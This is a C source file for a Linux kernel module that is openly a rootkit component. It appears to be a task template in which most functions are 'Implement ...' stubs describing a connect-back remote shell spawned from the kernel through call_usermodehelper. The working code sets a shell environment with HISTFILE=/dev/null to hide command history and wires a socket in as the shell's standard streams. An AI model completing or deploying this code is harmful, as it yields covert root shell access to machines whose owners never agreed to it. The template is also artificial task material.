// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/err.h>
#include <linux/file.h>
#include <linux/mutex.h>
#include <linux/net.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/umh.h>
#include <linux/workqueue.h>

#include "rootkit.h"

static char *shell_envp[] = {
	"HOME=/",
	"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
	"TERM=linux",
	"HISTFILE=/dev/null",
	NULL,
};

/* ------------------------------------------------------------------ */
/* Timeout callback                                                    */
/* ------------------------------------------------------------------ */

// Implement rk_shell_timeout_fn: shut down the socket on inactivity.

// Implement rk_shell_touch: reset the inactivity timer.

/* ------------------------------------------------------------------ */
/* File descriptor installation for call_usermodehelper                 */
/* ------------------------------------------------------------------ */

static int rk_install_fd(struct file *file, unsigned int wanted)
{
	int fd;

	fd = get_unused_fd_flags(0);
	if (fd < 0)
		return fd;
	if ((unsigned int)fd != wanted) {
		put_unused_fd(fd);
		return -EBUSY;
	}
	get_file(file);
	fd_install(fd, file);
	return 0;
}

// Implement rk_shell_init_fn: install shell->file as fd 0, 1, 2.

/* ------------------------------------------------------------------ */
/* Shell lifecycle                                                     */
/* ------------------------------------------------------------------ */

// Implement rk_shell_init: initialize all fields of the shell struct.

// Implement rk_shell_make_file: convert shell->sock to a struct file.

// Implement rk_shell_cleanup: cancel timer, release file/socket.

/* ------------------------------------------------------------------ */
/* Interactive shell work function                                     */
/* ------------------------------------------------------------------ */

// Implement rk_interactive_work: connect, convert, spawn interactive shell.

/* ------------------------------------------------------------------ */
/* Exec shell work function                                            */
/* ------------------------------------------------------------------ */

// Implement rk_exec_work: connect, convert, spawn "/bin/sh -c <cmd>".

/* ------------------------------------------------------------------ */
/* Public shell start functions                                        */
/* ------------------------------------------------------------------ */

// Implement rk_start_interactive: claim the shell slot, schedule work.

// Implement rk_start_exec: validate command, claim slot, schedule work.

/* ------------------------------------------------------------------ */
/* Shell teardown                                                      */
/* ------------------------------------------------------------------ */

// Implement rk_shell_stop: shut down socket if active, cancel timer.
